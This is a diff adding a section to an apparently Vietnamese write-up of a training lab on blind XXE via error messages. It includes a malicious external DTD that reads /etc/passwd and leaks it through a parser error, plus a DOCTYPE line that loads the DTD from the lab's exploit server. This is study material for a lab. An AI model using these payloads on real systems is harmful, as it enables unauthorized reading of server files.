@@ -105,7 +105,40 @@ Quay lại Collaborator lấy được code và hoàn thành bài lab
 ## Flag
 ![image](https://github.com/user-attachments/assets/abc1dd1d-400c-4e31-9ef0-93a374758f1a)
 
+# Exploiting blind XXE to retrieve data via error messages
+## Target Goal
+This lab has a "Check stock" feature that parses XML input but does not display the result.
 
+To solve the lab, use an external DTD to trigger an error message that displays the contents of the`/etc/passwd` file.
+
+The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.
+## Analysis
+Đối với mục tiêu của bài lab, ta sẽ tấn công vào tính năng `Check stock`
+
+![image](https://github.com/user-attachments/assets/ca7567e8-72fc-4535-804f-0b9196276c5e)
+
+Sử dụng Burp để xem nội dung gói tin 
+
+![image](https://github.com/user-attachments/assets/74c76974-56ab-4a61-a244-d1294abab789)
+
+Payload này sẽ đọc nội dung của file mục tiêu nhưng sau đó sẽ chèn vào đường dẫn `invalid/` . Đúng như tên gọi thì filepath này thường sẽ không hợp lệ -> Gây ra lỗi -> In ra Error message:
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+```
+
+Giống với bài lab trước: Copy vào `Exploit Server` -> `Store` -> Định nghĩa XML Parameter với đường dẫn tới DTD file trên exploit server -> Chèn vào XML của request `checkStock`
+
+![image](https://github.com/user-attachments/assets/c5be980a-45bf-4da1-9641-d31f9b68ab16)
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a3b00f0034fcb8186a2dd44018200cf.exploit-server.net/exploit"> %xxe; ]>
+```
+![image](https://github.com/user-attachments/assets/ec39a48d-8d2a-4d94-904b-7a1fdca8c57a)
+
+## Flag
+![image](https://github.com/user-attachments/assets/ac59c477-b6a5-4938-a0ee-1723cf9cb8ca)
 
 
 
